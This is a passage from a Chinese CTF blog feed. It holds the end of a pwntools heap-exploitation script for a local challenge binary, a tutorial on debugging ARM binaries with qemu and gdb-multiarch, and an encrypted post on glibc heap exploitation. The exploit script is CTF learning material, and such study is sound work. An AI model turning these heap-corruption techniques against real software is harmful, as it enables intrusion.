class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./run.sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">choice</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;3. ???\n&#x27;</span>, <span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;size: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gift</span>():</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 0</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>) <span class="comment"># 3</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">gift()</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">0x50</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0x3fa4</span>))</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">4</span> + p64(<span class="number">0x2da</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>记一次使用gdb来调试异构程序</title>
      <link href="/2023/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BD%BF%E7%94%A8gdb%E6%9D%A5%E8%B0%83%E8%AF%95%E5%BC%82%E6%9E%84%E7%A8%8B%E5%BA%8F/"/>
      <url>/2023/11/16/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BD%BF%E7%94%A8gdb%E6%9D%A5%E8%B0%83%E8%AF%95%E5%BC%82%E6%9E%84%E7%A8%8B%E5%BA%8F/</url>
      
        <content type="html"><![CDATA[<p>由于我的电脑是<code>x86</code>框架，所以无法直接启动<code>arm</code>程序，所以选择用<code>qemu</code></p><h3 id="安装qemu相关配置"><a href="#安装qemu相关配置" class="headerlink" title="安装qemu相关配置"></a>安装qemu相关配置</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt search qemu</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">sudo apt-get install qemu-user-static<span class="comment"># 静态链接的 qemu-user</span></span></span><br><span class="line">sudo apt-get install qemu-user-binfmt# 此命令有用，会在 /usr/bin 目录下生成 qemu-*</span><br><span class="line">sudo apt-get install qemu-system# 此命令有用，会在 /usr/bin 目录下生成 qemu-system-*</span><br></pre></td></tr></table></figure><h3 id="启动gdb进行调试"><a href="#启动gdb进行调试" class="headerlink" title="启动gdb进行调试"></a>启动gdb进行调试</h3><p>首先我们在一个终端中输入下面的命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or4nge@圈圈:/mnt/d/desktop/pwnme$ qemu-arm -L ./ -g 8888 ./pwn</span><br></pre></td></tr></table></figure><p>其中<code>8888</code>是端口号，可以自己定义<br>第一个<code>./</code>是<code>arm</code>的相关配置文件夹<code>lib</code>在当前路径下<br>pwn为我们要调试的二进制文件<br>然后再重新打开另外一个窗口，进入到我们需要调试的文件的目录下，进行下面的操作：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">or4nge@圈圈:/mnt/d/desktop/pwnme$ gdb-multiarch</span><br><span class="line">GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1</span><br><span class="line">Copyright (C) 2022 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">Type &quot;show copying&quot; and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.</span><br><span class="line">pwndbg: loaded 149 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida GDB functions (can be used with print/break)</span><br><span class="line">------- tip of the day (disable with set show-tips off) -------</span><br><span class="line">Use GDB&#x27;s pi command to run an interactive Python console where you can use Pwndbg APIs like pwndbg.gdblib.memory.read(addr, len), pwndbg.gdblib.memory.write(addr, data), pwndbg.gdb.vmmap.get() and so on!</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">file pwn</span></span><br><span class="line">Reading symbols from pwn...</span><br><span class="line">(No debugging symbols found in pwn)</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> architecture arm    <span class="comment"># 指定框架</span></span></span><br><span class="line">The target architecture is set to &quot;arm&quot;.</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote localhost:8888  <span class="comment"># 进行连接</span></span></span><br><span class="line">Remote debugging using localhost:8888</span><br><span class="line">warning: remote target does not support file transfer, attempting to access files from local filesystem.</span><br><span class="line">Reading symbols from /mnt/d/desktop/pwnme/lib/ld-uClibc.so.0...</span><br><span class="line">(No debugging symbols found in /mnt/d/desktop/pwnme/lib/ld-uClibc.so.0)</span><br></pre></td></tr></table></figure><p>然后我们就可以愉快的进行调试了</p><h3 id="安装lib库"><a href="#安装lib库" class="headerlink" title="安装lib库"></a>安装lib库</h3><p>突然想起有的题目不会给出<code>lib</code>文件，所以这里讲讲怎么下载(以<code>arm64</code>为例)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt search &quot;libc6-&quot; | grep &quot;arm&quot;</span><br><span class="line">sudo apt install libc6-arm64-cross</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">安装好的库/usr/aarch64-linux-gnu/lib/目录下</span></span><br></pre></td></tr></table></figure><p>此时<code>lib</code>已经自动安装至<code>/usr/aarch64-linux-gnu/</code>目录下，调试时可以通过</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -L /usr/aarch64-linux-gnu/ -g 8888 ./pwn</span><br></pre></td></tr></table></figure><p>来指定<code>lib</code>的路径</p><h3 id="使用process连接elf文件"><a href="#使用process连接elf文件" class="headerlink" title="使用process连接elf文件"></a>使用process连接elf文件</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = process(<span class="string">&#x27;qemu-arm -L ./ ./pwn&#x27;</span>, shell = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure><h3 id="利用pwntools直接连接gdb"><a href="#利用pwntools直接连接gdb" class="headerlink" title="利用pwntools直接连接gdb"></a>利用pwntools直接连接gdb</h3><p>首先<code>process</code>中的参数要做修改</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p = process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;./&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])  <span class="comment"># 各个参数的含义和上面直接在shell中运行一样</span></span><br></pre></td></tr></table></figure><p>这时运行脚本(脚本中不需要调用<code>gdb</code>)，可以看到下面的场景</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">or4nge@圈圈:/mnt/d/desktop$ python3 exp.py  </span><br><span class="line">[+] Starting local process &#x27;/usr/bin/qemu-arm&#x27;: pid 4958</span><br><span class="line">[*] &#x27;/mnt/d/desktop/pwn&#x27;</span><br><span class="line">    Arch:     arm-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x10000)</span><br><span class="line">[DEBUG] Wrote gdb script to &#x27;/tmp/pwn_18guhmr.gdb&#x27;</span><br><span class="line">    set endian little</span><br><span class="line">    set architecture arm</span><br><span class="line">[*] running in new terminal: [&#x27;/usr/bin/gdb-multiarch&#x27;, &#x27;-q&#x27;, &#x27;4958&#x27;, &#x27;-x&#x27;, &#x27;/tmp/pwn_18guhmr.gdb&#x27;]</span><br><span class="line">[DEBUG] Created script for new terminal:</span><br><span class="line">    #!/usr/bin/python3</span><br><span class="line">    import os</span><br><span class="line">    os.execve(&#x27;/usr/bin/gdb-multiarch&#x27;, [&#x27;/usr/bin/gdb-multiarch&#x27;, &#x27;-q&#x27;, &#x27;4958&#x27;, &#x27;-x&#x27;, &#x27;/tmp/pwn_18guhmr.gdb&#x27;], os.environ)</span><br><span class="line">[DEBUG] Launching a new terminal: [&#x27;/usr/bin/tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;, &#x27;/tmp/tmpw26wjqb0&#x27;]</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"><span class="meta prompt_">$</span></span><br></pre></td></tr></table></figure><p>此时打开另外一个终端，进行下面的操作</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">or4nge@圈圈:/mnt/d/desktop$ gdb-multiarch -nx ./pwn # 注意要加nx，如果你安装了pwndbg然后不加直接运行的话可能在步进的时候会出错。</span><br><span class="line">GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1</span><br><span class="line">Copyright (C) 2022 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.</span><br><span class="line">Type &quot;show copying&quot; and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;https://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">    &lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line"></span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...</span><br><span class="line">Reading symbols from ./pwn...</span><br><span class="line">(No debugging symbols found in ./pwn)</span><br><span class="line">(gdb) source ./pwndbg/gdbinit.py  # 将pwntools加载进来</span><br><span class="line">pwndbg: loaded 149 pwndbg commands and 47 shell commands. Type pwndbg [--shell | --all] [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida GDB functions (can be used with print/break)</span><br><span class="line">------- tip of the day (disable with set show-tips off) -------</span><br><span class="line">GDB&#x27;s apropos &lt;topic&gt; command displays all registered commands that are related to the given &lt;topic&gt;</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> endian little  <span class="comment"># 设置小端序</span></span></span><br><span class="line">The target is set to little endian.</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="built_in">set</span> sysroot ./  <span class="comment"># bin的路径</span></span></span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">target remote localhost:1234  <span class="comment"># 远程连接</span></span></span><br><span class="line">Remote debugging using localhost:1234</span><br><span class="line">Reading symbols from ./lib/ld-uClibc.so.0...</span><br><span class="line">(No debugging symbols found in ./lib/ld-uClibc.so.0)</span><br><span class="line">0x3ffe91b8 in ?? () from ./lib/ld-uClibc.so.0</span><br><span class="line">Unknown register type: None</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────</span><br><span class="line"> R0   0x0</span><br><span class="line"> R1   0x40800487 ◂— &#x27;./pwn&#x27;</span><br><span class="line"> R2   0x0</span><br><span class="line"> R3   0x0</span><br><span class="line"> R4   0x0</span><br><span class="line"> R5   0x0</span><br><span class="line"> R6   0x0</span><br><span class="line"> R7   0x0</span><br><span class="line"> R8   0x0</span><br><span class="line"> R9   0x0</span><br><span class="line"> R10  0x20f20 —▸ 0x1055c ◂— ldr r3, [pc, #0x1c]</span><br><span class="line"> R11  0x0</span><br><span class="line"> R12  0x0</span><br><span class="line"> SP   0x40800370 ◂— 0x1</span><br><span class="line"> PC   0x3ffe91b8 ◂— mov r0, sp /* &#x27;\r&#x27; */</span><br><span class="line">───────────────────────────────────────────────────────────────────[ DISASM / arm / set emulate on ]───────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0x3ffe91b8    mov    r0, sp</span><br><span class="line">   0x3ffe91bc    bl     #0x3ffedf3c                   &lt;0x3ffedf3c&gt;</span><br><span class="line"></span><br><span class="line">   0x3ffe91c0    mov    r6, r0</span><br><span class="line">   0x3ffe91c4    ldr    sl, [pc, #0x30]</span><br><span class="line">   0x3ffe91c8    add    sl, pc, sl</span><br><span class="line">   0x3ffe91cc    ldr    r4, [pc, #0x2c]</span><br><span class="line">   0x3ffe91d0    ldr    r4, [sl, r4]</span><br><span class="line">   0x3ffe91d4    ldr    r1, [sp]</span><br><span class="line">   0x3ffe91d8    sub    r1, r1, r4</span><br><span class="line">   0x3ffe91dc    add    sp, sp, r4, lsl #2</span><br><span class="line">   0x3ffe91e0    add    r2, sp, #4</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────</span><br><span class="line">00:0000│ sp 0x40800370 ◂— 0x1</span><br><span class="line">01:0004│    0x40800374 —▸ 0x40800487 ◂— &#x27;./pwn&#x27;</span><br><span class="line">02:0008│    0x40800378 ◂— 0x0</span><br><span class="line">03:000c│    0x4080037c —▸ 0x4080048d ◂— &#x27;_=/usr/bin/python3&#x27;</span><br><span class="line">04:0010│    0x40800380 —▸ 0x408004a0 ◂— &#x27;OLDPWD=/mnt/d/desktop/mips/bins&#x27;</span><br><span class="line">05:0014│    0x40800384 —▸ 0x408004c0 ◂— &#x27;HOSTTYPE=x86_64&#x27;</span><br><span class="line">06:0018│    0x40800388 —▸ 0x408004d0 ◂— 0x48544150 (&#x27;PATH&#x27;)</span><br><span class="line">07:001c│    0x4080038c —▸ 0x408008b6 ◂— &#x27;XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop&#x27;</span><br><span class="line">─────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────</span><br><span class="line"> ► 0 0x3ffe91b8</span><br><span class="line">   1      0x0</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="meta prompt_">pwndbg&gt;</span></span><br></pre></td></tr></table></figure><p>此时即可进行调试<br>参考连接：<br><a href="https://binlep.github.io/old_blog_01/2020/03/20/%E3%80%90Pwn%20%E7%AC%94%E8%AE%B0%E3%80%91%E8%B7%A8%E5%B9%B3%E5%8F%B0%E6%9E%B6%E6%9E%84%E7%9A%84%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E4%B8%8E%E8%B0%83%E8%AF%95/">https://binlep.github.io/old_blog_01&#x2F;2020&#x2F;03&#x2F;20&#x2F;【Pwn 笔记】跨平台架构的环境配置与调试&#x2F;</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>高版本glibc堆利用笔记</title>
      <link href="/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/11/13/%E9%AB%98%E7%89%88%E6%9C%ACglibc%E5%A0%86%E5%88%A9%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="67867aac57121a181a50888c5918ba1af8dda8c66901af7f4d9eb5f253c03902">9fa594bc77abcd4cc97d75ee589fda6f57148e15500659b0fd9d14440cced3b2bf75459df7f8d07fe0ad807e51552d3ec0a9045cae2eb86fdc6b4b15d7660da9d215d32170941f6ceb8e1a6135c5a7d434ee5adb7f7832ae3f0fdd67639fc9b7be78db8ef8a1e10d4183e90162026134ed956611d6cc875cbf2d7e78129d78710b64d55c0d949a21a37fd2a4d9db13f830e7690226ea356361b370849a1c1567938e975fee60405a45ae1b663e288955a7ba594edfcc82f859170bd76798a807af17002f22808c49e255339bf0be68ef1388dca2bb666d38cd4103c8f6033852c0f42d2dd31376d22b427548e29599c28693b8ad1b727a80c24e453cdab8864c3395ab633e8e778bc090f72d02f1975946e421403b38bc84cc363716d83d78ef7f53b4d605f430484fd708ac03abae4bd40fefbba8b1023f82f4728bba2777b7a5e8f386a83bc1084d0262c035644c32ce2ce569b921e4ddf579609d6d14364d6e162e423b65ae53e174e1847b030a1404ace975d6b5ed3baf10f9182929ed8f7ee7b528b0c0df069c62138b40646d3d35868c1fe87a3846087997c2402cd6d4045459c1f78cdc9a6c40b1ad8856b3cace18fe33ef9970d58475bc094c2b4361a47af494cd6d8f0949bec4394f12201e6393b40c5e1594aa4b634c9f7cf1723eb0e0778776746ed790ea072ef6a7c446c3b8ca1926b4ff6cb823a710fdb3c615fb807a71c11f255fff0b71a4efdca66af991dd00df05ee11d5fc5205fb532d730d89a25088d1f9d7835e2d7bdb9051bfdf1b0daf942b572bfb478a2bf5ec46293c86d53b0214cdf55e516ca9e09c71a3d55e2e084aea5c18fcafda0048ee6709e0a4aac8c4992024acc1ea9961dacd7fea2409205a2727ad17e33a33fe2594260eacab72bbbba7b711793a19d80bf55dcba7a2de32bcd4e9f2129cbfec8ff342d957dbd85de1d4f646a7a5d7f73f1feec2356307299c9520847908faac122147baa61f84e3c54246edb3f0e37ce3a92e27f13f17940e7abb1d424cd1717cd4ee520955c31462df0c2e54ed3f53c7a84dceadf68024e1bd60d715a0b6da4ee624c105d5735c7c1ef18e09302bbec1ebbff72c88e288b810df2c2493f30e4c623e6e67fb6392a283ed47fc13ba2fcf1ce55ab9f4f909f8cfc87d58db200428a2a8aea86dedd270552e6b6f9e349c6dddacfa01eebbd07a69f0adda0f296acc1356844b4cfed7cfc3b4612f05f88cd8d44ac08a680d496cc4f2cb7d3e3151b116ddd3dc7e16ad4e3715914067d8d5f6af1ed90fe99f014ca4b6efb352b8f0051c02a9740d24fadb6b7909172ebed7a8b46284920329da0cae2b5a5d82e4ee5aaa9d19d5b66d311d56f9e8989d810375e101a91543442c456dc31ccc98c58d459144780b7a36a3497d33883479094f6e57eb9aa878b77f58c7b0e340c213d0a3b71de873a46dd4952d1fb66bdecd5a9632eaf02c7478950fa68aa3613b214b000015bdee2ee2724cffd2c170e63e3c5b4f73b4c5a609c121228eee933d565cb8d8ed2242aba6707c618a8c33ddc8261611610ac088cf6277f07bbca05b58667d552f54bd25944f9ea899bc6535ec708c027db3699e92450791364f1b926fac0090eb27979dad1a119a4b1b63879f27eecccbf8a12f5084c0a1b526f6a893f3b77d8b7844e7b0549d366497493fc16d3d11cb22dc42ea45096dda69f356c63583ab3a70b614d0618aa6e987d1806bb9785321e962ce270034d40e2f0afa68a18de02509edfa2b834655a532b92b7bb15142a7c0b2c3526ebdd0329143b6539266afc0f6ff8e1ad9682fc68a930df3098146637a551ce0cc8a8f9b30d582022f32d35481f571d13bf414d00bd7216ef412485d826784fce252466a49f91aef4ff6715e03e6aa0f79208a672fb9b2324bf331dcd8ef88ca0478591fa5a82011b1b555ff6110745deb8ff258286343d8dada7ea73050b1aa5309dfb7f567f83322d0128f9599a55c38c2d54dfc0fe51047b7d9d66d85151af24ada609b2b8f328f8e2a724dcb193c0d3e923c816998343f111609064e6bbd5e94cf4216c696a6475f140cfe3e6946f6f518e4270c0ca750621f8d31e318ba3f6167997c38d0b4ec124d5f9ee5c265fcfcc1bc76bf51a041afc64659b5408396dcfe14e1b7a5c569a0792779454f620e5d191d52a905d6cef03391d4c1116937f13f8a255dc6678e26687711e22a5054f5a4af0db76b167234080b2c1ed76531018e4a79060aed766be407d383c6aee84a572e8a112f2bbcc1a2c25ac406c8118ca6d55a97b972403695fa3f32c2830dbd5a0e6986f584df8d34e25214622c1cb90ae46d55e715f9de5efb145ada3e8b455dacb15e58f83fecba54f467dbffef13689f48b397a2586682add28f35165b4b65ebc70244cf1923d5f79d499b545441dfe22eea25b2d6ac91186936f7ea0bdc66a79a8f59cd1f1487964e1fe84f678a0dc225947001f732dee3b81f10ddcd00520d78b4ddae9856a5dd98c520f605937ae26a086a99f072b1848a06118dcc1dedbf26ab41b502e3f1b7e22e432825e041cb2442b676fb0af5f098f4b05fff3d7ad6352c34a628a501568fba919229c090cfd65bdde7065a23411da33b2b09bcb6e5e6b230bfc85fcbf9da7c8b4fbedc511b6ca734868448d8537eaa0b13bf6e96489cb6f7dbc061d2a4088896c2bf046e0ecdc3a1375d9f0ffdf90696ad213cf88dda50a75d993845c0384dce645df400c0b0d5ef0c98690feb823490764b5a4b525ce91e7a2f7046e200d0ee97898ddfc8bb4d8da48e56751e85753c4fc338ee9766bf5b5085643aa967a78c6d23820f5e749334b747eb9b05ae1f80a1a0eb91b5af9b40411037c248640e19b9acbf1157c6531c7c1cb2626ba1f7b28932241e29b2250182b8fe546ae5dd503271166711374955c2444b3f5e1d4b72a4c5fa165d7c5140170cc07e6af7cc85095398a93ae85d07e8d2d6e77226cf8c4008f242540eb9e9a883f629d2463fc6cdcad85867a2896065178683106d7a6e2eac24b828eea0962cfe134bd9a0d04bebbae0ddaf04315f9e1009b4137b48962a7490a7773e32ced084bf9413a60fb10f468fc8597b7ec5444b0e2dbe372cdb38dd1856a3e7a73575a689ef958a51ab41f469874cee40d07d1651d7d72a77ef6918da1d81e1ebac0869e74daad01416700ca03c37905c4bd9e0050f2b8a8c3ead64e9d7a9cd0846981e1ed06f5fea4729074be7628184cea562d3f0cc37c11d9c2f42d5b3d523bec2a078215fce939fe76a2dc2abcafdc40d42f3b327f4463d2bc04ba79f50e6a8147d8684e7558976125c5ac5b5bd031783c8173bb0c43cef1a95e1f535503ef18a4ac18bf74e17ddbcdd5a50824a86445985361b2653b7675b15b779118a88d4c43103e12cd1b69c0fea0da8fe54a8bc07e588866d0804a9ce4a1c446ff4fdfd6d985251b651274870cf1b55ca504fabdec8ed4d7996883d657c9ce82ed99dec79f0551e1d9375ff6d51e574019ae64180be12a6cfde8decca8c7e35ad355cb61a2bf67ad5c42daa949bf600033be41a06885ada80abf902bd4fc8d19e5e3891f39e9d285881df0d0071ad11bcb5aa60f18193bdaca36c523eaa1f8b0dee847f6c29e2bf5fde9adecf14185530dd39bc7653ef4c0ebbe6f0d539a360e55aa4daafd7d24993d688fad50c480eb30e202fd772ed83f8ddea1f07550cdbe4cc07f20e50b5c786001050565c2a2ea0df78edf30f9a6fe2925d54323ccac1a50be5c23b82d8b82fb51b9e8120e4b5a94b8c8aecc057f8e493e194c04950e70e3a29c09d3035115ee05ea6d1f64e52845248bf00ae11b8d8d3b0724e2849bc0f0409b8ef9420c2306e1dcba24b5f85d239415a26832c321335e61c7709f81cd54f19df62f34f63b2344a3b34a1ebdadee02a07228ce5086291adfe5303cbc0ae5f2a1276712406442f9f2b803cc7d97f928a5d5c031ea778eb5fafd53305ca97e80a2e858bb650405702a7f776c0bb5b800c279ef928f7f02b32783357b6912ebbda10dc6d466fb67e6e50792a327d351949855fb31766f8140771353b3b8a6c6637bb9b3aa7dfc7e4b683634f6fa62617eba9f94cbf63c0d214d2024a90255a2bf530ba8eb08fd9c12f97376de6186a01d72e8ead2deb9c323114e9a51d52ec65115e1e69e54921e23c2d1ce7e52854304ed26c7e16f7b49ba2aa2b4d08dbb6f547fa9bc74e3548a9725b4f7fdef9b21ec281818f085e997c13adfaad4b97a278a3ff78f26b0e4a6fa258b758f6f8a37e4d0b140151631e7837456bc012101326403f3846d6a2aeeca34d774edba6fbeb595ee19514109bc5e4ac556247034dd761cf4ace64b5fb955a0ea58f9b354ff0a48d5a4da15cd3118992d9ef14c13b65298bc1a8067e5100f52aa14f732d246be5f27f70b1313a3f1307c06a11914d7f7b2253c471a5ea6eb7a05394b75a6bc30d3d4530b8a77ad9599d27a4bebbaa91b3b896707f97048694caf9047e6fa71efe6c966219adbb08dc04eb25959aa45432d2e89186be30d7f6ced1e69c28c4d7df56c193cd790e1b1c360f17d5e85cde01392eeda35c87dc13d6ad1e9d3ebce7d700eb3ecc6e3d62c68164b1e524be8b9e9bffffcef64b33657b201eb8672027b8ca7ad4bfd63ed941e65218f753c2571f027180649d6c5e621a286d4a1981fed392d6f99cfd390432442fb64c8ae781848ee597b8b5e18a07bde47c7323d69cf3dd21b420ded38434abb622461f1f339d2cb17a5e3bb98af0c6701b5e64459c29eec920ec40979ca41ee85fcd7c2a45fcb20bf6d38f874069c92577c2409a39de8ecd17635bca129a6a1564158af148e155be374334f7180173a158a77776909ff5442ec105a6852585